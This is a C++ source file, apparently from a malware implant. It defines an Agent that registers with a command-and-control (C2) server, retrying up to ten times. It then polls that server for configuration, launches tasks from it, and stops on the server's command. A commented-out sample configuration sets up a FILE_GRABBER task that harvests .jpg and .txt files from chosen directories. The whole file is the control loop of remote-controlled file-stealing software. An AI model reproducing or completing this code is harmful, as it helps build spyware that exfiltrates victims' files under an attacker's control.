#include "Agent.h"

void Agent::start()
{
    // std::string json_string = R"(
    // {
    //     "FILE_GRABBER": 
    //     {
    //         "1337": 
    //         {
    //         "start_path": "/tmp/aa",
    //         "files": [".*.jpg", ".*\\.txt$"]
    //         },
    //         "1338": 
    //         {
    //             "start_path": "/tmp/gg",
    //             "files": [".*abcd"]
    //         },
    //         "restart": "1"
    //     }
    // }
    // )";
    
    // json config = json::parse(json_string);
    // start_from_config(config);
    // sleep(60 * 10);

    unsigned tries = 0;

    while (!agent_register())
    {
        tries += 1;
        if (tries >= 10)
        {
            throw std::runtime_error("Can't register to C2");
        }
        
        sleep(5);
    }
    
    std::cout << "successfully registered to c2" << std::endl;

    while (agent_run)
    {
        if(get_server_config())
        {
            if (config.contains("stop") && config["stop"] == "1")
            {
                stop();
                break;
            }
            
            start_from_config(config);
        }
        sleep(NEW_CMD_INTERVAL);
    }
}


void Agent::stop()
{
    for (const std::unique_ptr<Task> & t : tasks)
    {
        t->stop();
    } 
    agent_run = false;
}